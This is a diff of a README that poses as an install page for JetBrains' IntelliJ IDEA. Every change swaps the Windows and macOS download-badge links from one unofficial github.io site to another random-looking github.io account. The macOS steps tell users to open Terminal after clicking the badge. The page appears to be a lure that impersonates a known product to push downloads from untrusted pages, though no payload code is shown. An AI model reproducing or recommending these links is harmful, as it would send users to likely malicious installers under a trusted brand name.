@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install IntelliJ IDEA](https://img.shields.io/badge/⬇_Install_IntelliJ+IDEA-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install IntelliJ IDEA](https://img.shields.io/badge/⬇_Install_IntelliJ+IDEA-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -61,9 +61,9 @@ IntelliJ IDEA is JetBrains' flagship Java and JVM language IDE, widely regarded 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ IntelliJ IDEA is JetBrains' flagship Java and JVM language IDE, widely regarded 
 
 <div align="center">
 
-[![⬇ Install IntelliJ IDEA](https://img.shields.io/badge/⬇_Install_IntelliJ+IDEA-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install IntelliJ IDEA](https://img.shields.io/badge/⬇_Install_IntelliJ+IDEA-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ IntelliJ IDEA is JetBrains' flagship Java and JVM language IDE, widely regarded 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ IntelliJ IDEA is JetBrains' flagship Java and JVM language IDE, widely regarded 
 
 <div align="center">
 
-[![⬇ Install IntelliJ IDEA](https://img.shields.io/badge/⬇_Install_IntelliJ+IDEA-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install IntelliJ IDEA](https://img.shields.io/badge/⬇_Install_IntelliJ+IDEA-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
